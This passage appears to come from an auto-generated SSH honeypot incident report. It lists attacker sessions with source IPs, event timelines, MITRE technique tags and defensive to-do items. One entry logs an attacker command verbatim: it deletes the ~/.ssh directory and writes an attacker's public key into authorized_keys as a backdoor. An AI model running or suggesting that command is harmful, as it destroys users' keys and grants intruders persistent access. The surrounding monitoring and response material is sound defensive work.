- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bebd3d8f2ae

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:54` | `cowrie.session.connect` |
| `2026-09-03 09:26:54` | `cowrie.client.version` |
| `2026-09-03 09:26:54` | `cowrie.client.kex` |
| `2026-09-03 09:26:55` | `cowrie.login.success` |
| `2026-09-03 09:26:55` | `cowrie.session.params` |
| `2026-09-03 09:26:55` | `cowrie.command.input` |
| `2026-09-03 09:26:55` | `cowrie.log.closed` |
| `2026-09-03 09:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360098285e2d

| Field | Detail |
|---|---|
| **Source IP** | `150.5.154[.]160` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:54` | `cowrie.session.connect` |
| `2026-09-03 09:26:54` | `cowrie.client.version` |
| `2026-09-03 09:26:55` | `cowrie.client.kex` |
| `2026-09-03 09:26:57` | `cowrie.login.success` |
| `2026-09-03 09:26:58` | `cowrie.session.params` |
| `2026-09-03 09:26:58` | `cowrie.command.input` |
| `2026-09-03 09:26:58` | `cowrie.command.failed` |
| `2026-09-03 09:26:59` | `cowrie.log.closed` |
| `2026-09-03 09:26:59` | `cowrie.session.params` |
| `2026-09-03 09:26:59` | `cowrie.command.input` |
| `2026-09-03 09:27:00` | `cowrie.session.file_download` |
| `2026-09-03 09:27:00` | `cowrie.log.closed` |
| `2026-09-03 09:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.154[.]160` to AbuseIPDB if not already reported
- [ ] Block `150.5.154[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c17c8c518343

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:56` | `cowrie.session.connect` |
| `2026-09-03 09:26:56` | `cowrie.client.version` |
| `2026-09-03 09:26:56` | `cowrie.client.kex` |
| `2026-09-03 09:26:56` | `cowrie.login.success` |
| `2026-09-03 09:26:57` | `cowrie.session.params` |
| `2026-09-03 09:26:57` | `cowrie.command.input` |
| `2026-09-03 09:26:57` | `cowrie.log.closed` |
| `2026-09-03 09:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e8dd233ad73

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:57` | `cowrie.session.connect` |
| `2026-09-03 09:26:57` | `cowrie.client.version` |
| `2026-09-03 09:26:57` | `cowrie.client.kex` |
| `2026-09-03 09:26:58` | `cowrie.login.success` |
| `2026-09-03 09:26:59` | `cowrie.session.params` |
| `2026-09-03 09:26:59` | `cowrie.command.input` |
| `2026-09-03 09:26:59` | `cowrie.log.closed` |
| `2026-09-03 09:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa3d99a5b4d3

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:59` | `cowrie.session.connect` |
| `2026-09-03 09:26:59` | `cowrie.client.version` |
| `2026-09-03 09:26:59` | `cowrie.client.kex` |
| `2026-09-03 09:27:00` | `cowrie.login.success` |
| `2026-09-03 09:27:00` | `cowrie.session.params` |
| `2026-09-03 09:27:00` | `cowrie.command.input` |
| `2026-09-03 09:27:01` | `cowrie.log.closed` |
| `2026-09-03 09:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bbb8814da1a

| Field | Detail |
|---|---|
| **Source IP** | `150.5.154[.]160` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:00` | `cowrie.session.connect` |
| `2026-09-03 09:27:00` | `cowrie.client.version` |
| `2026-09-03 09:27:00` | `cowrie.client.kex` |
| `2026-09-03 09:27:02` | `cowrie.login.success` |
| `2026-09-03 09:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.154[.]160` to AbuseIPDB if not already reported
- [ ] Block `150.5.154[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bded953a245

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:01` | `cowrie.session.connect` |
| `2026-09-03 09:27:01` | `cowrie.client.version` |
| `2026-09-03 09:27:01` | `cowrie.client.kex` |
| `2026-09-03 09:27:01` | `cowrie.login.success` |
| `2026-09-03 09:27:02` | `cowrie.session.params` |
| `2026-09-03 09:27:02` | `cowrie.command.input` |
| `2026-09-03 09:27:02` | `cowrie.log.closed` |
| `2026-09-03 09:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76e2b2c32678

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:02` | `cowrie.session.connect` |
| `2026-09-03 09:27:02` | `cowrie.client.version` |
| `2026-09-03 09:27:02` | `cowrie.client.kex` |
| `2026-09-03 09:27:02` | `cowrie.login.success` |
| `2026-09-03 09:27:03` | `cowrie.session.params` |
| `2026-09-03 09:27:03` | `cowrie.command.input` |
| `2026-09-03 09:27:03` | `cowrie.log.closed` |
| `2026-09-03 09:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c3b7893724

| Field | Detail |
|---|---|
| **Source IP** | `150.5.154[.]160` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:02` | `cowrie.session.connect` |
| `2026-09-03 09:27:02` | `cowrie.client.version` |
| `2026-09-03 09:27:03` | `cowrie.client.kex` |
| `2026-09-03 09:27:04` | `cowrie.login.success` |
| `2026-09-03 09:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.154[.]160` to AbuseIPDB if not already reported
- [ ] Block `150.5.154[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c132d632cc55

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:03` | `cowrie.session.connect` |
| `2026-09-03 09:27:03` | `cowrie.client.version` |
| `2026-09-03 09:27:03` | `cowrie.client.kex` |
| `2026-09-03 09:27:04` | `cowrie.login.success` |
| `2026-09-03 09:27:04` | `cowrie.session.params` |
| `2026-09-03 09:27:04` | `cowrie.command.input` |
| `2026-09-03 09:27:05` | `cowrie.log.closed` |
| `2026-09-03 09:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b752c0c7250a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:05` | `cowrie.session.connect` |
| `2026-09-03 09:27:05` | `cowrie.client.version` |
| `2026-09-03 09:27:05` | `cowrie.client.kex` |
| `2026-09-03 09:27:05` | `cowrie.login.success` |
| `2026-09-03 09:27:06` | `cowrie.session.params` |
| `2026-09-03 09:27:06` | `cowrie.command.input` |
| `2026-09-03 09:27:06` | `cowrie.log.closed` |
| `2026-09-03 09:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1c3226f474

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:27 |
| **Last Seen** | 2026-09-03 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:27:06` | `cowrie.session.connect` |
| `2026-09-03 09:27:06` | `cowrie.client.version` |
| `2026-09-03 09:27:06` | `cowrie.client.kex` |
| `2026-09-03 09:27:06` | `cowrie.login.success` |
| `2026-09-03 09:27:07` | `cowrie.session.params` |
| `2026-09-03 09:27:07` | `cowrie.command.input` |
| `2026-09-03 09:27:07` | `cowrie.log.closed` |
| `2026-09-03 09:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0310201502e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:28 |
| **Last Seen** | 2026-09-03 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:28:15` | `cowrie.session.connect` |
| `2026-09-03 09:28:15` | `cowrie.client.version` |
| `2026-09-03 09:28:15` | `cowrie.client.kex` |
| `2026-09-03 09:28:16` | `cowrie.login.success` |
| `2026-09-03 09:28:16` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:28:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:28:17` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929d4c61961e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:31 |
| **Last Seen** | 2026-09-03 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:31:28` | `cowrie.session.connect` |
| `2026-09-03 09:31:28` | `cowrie.client.version` |
| `2026-09-03 09:31:28` | `cowrie.client.kex` |
| `2026-09-03 09:31:29` | `cowrie.login.success` |
| `2026-09-03 09:31:29` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:31:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:31:29` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad235bc5fba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:37 |
| **Last Seen** | 2026-09-03 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:37:37` | `cowrie.session.connect` |
| `2026-09-03 09:37:37` | `cowrie.client.version` |
| `2026-09-03 09:37:37` | `cowrie.client.kex` |
| `2026-09-03 09:37:38` | `cowrie.login.success` |
| `2026-09-03 09:37:38` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:37:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:37:39` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94d56465793b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:42 |
| **Last Seen** | 2026-09-03 09:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:42:18` | `cowrie.session.connect` |
| `2026-09-03 09:42:18` | `cowrie.client.version` |
| `2026-09-03 09:42:19` | `cowrie.client.kex` |
| `2026-09-03 09:42:19` | `cowrie.login.success` |
| `2026-09-03 09:42:20` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:42:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:42:20` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642b0f2b0246

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:47 |
| **Last Seen** | 2026-09-03 09:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:47:11` | `cowrie.session.connect` |
| `2026-09-03 09:47:11` | `cowrie.client.version` |
| `2026-09-03 09:47:11` | `cowrie.client.kex` |
| `2026-09-03 09:47:12` | `cowrie.login.success` |
| `2026-09-03 09:47:12` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:47:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:47:12` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4cfe925c36

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]55` |
| **First Seen** | 2026-09-03 09:50 |
| **Last Seen** | 2026-09-03 09:50 |
| **Session Duration** | 21s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:50:20` | `cowrie.session.connect` |
| `2026-09-03 09:50:20` | `cowrie.client.version` |
| `2026-09-03 09:50:20` | `cowrie.client.kex` |
| `2026-09-03 09:50:21` | `cowrie.client.fingerprint` |
| `2026-09-03 09:50:21` | `cowrie.login.failed` |
| `2026-09-03 09:50:21` | `cowrie.login.success` |
| `2026-09-03 09:50:41` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:50:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-03 09:50:41` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]55` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92355048eab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:52 |
| **Last Seen** | 2026-09-03 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:52:58` | `cowrie.session.connect` |
| `2026-09-03 09:52:58` | `cowrie.client.version` |
| `2026-09-03 09:52:58` | `cowrie.client.kex` |
| `2026-09-03 09:52:59` | `cowrie.login.success` |
| `2026-09-03 09:53:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:53:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:53:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ada16b7503f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:56 |
| **Last Seen** | 2026-09-03 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:56:38` | `cowrie.session.connect` |
| `2026-09-03 09:56:38` | `cowrie.client.version` |
| `2026-09-03 09:56:38` | `cowrie.client.kex` |
| `2026-09-03 09:56:39` | `cowrie.login.success` |
| `2026-09-03 09:56:39` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:56:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:56:40` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e000228c42

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:03 |
| **Last Seen** | 2026-09-03 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:03:38` | `cowrie.session.connect` |
| `2026-09-03 10:03:38` | `cowrie.client.version` |
| `2026-09-03 10:03:38` | `cowrie.client.kex` |
| `2026-09-03 10:03:39` | `cowrie.login.success` |
| `2026-09-03 10:03:39` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:03:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:03:39` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78cef1569dc6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:06 |
| **Last Seen** | 2026-09-03 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:06:03` | `cowrie.session.connect` |
| `2026-09-03 10:06:03` | `cowrie.client.version` |
| `2026-09-03 10:06:03` | `cowrie.client.kex` |
| `2026-09-03 10:06:04` | `cowrie.login.success` |
| `2026-09-03 10:06:04` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:06:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:06:04` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a150a0d1737

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 10:09 |
| **Last Seen** | 2026-09-03 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:09:42` | `cowrie.session.connect` |
| `2026-09-03 10:09:42` | `cowrie.client.version` |
| `2026-09-03 10:09:42` | `cowrie.client.kex` |
| `2026-09-03 10:09:43` | `cowrie.login.success` |
| `2026-09-03 10:09:43` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:09:43` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e17017e13154

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:14 |
| **Last Seen** | 2026-09-03 10:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
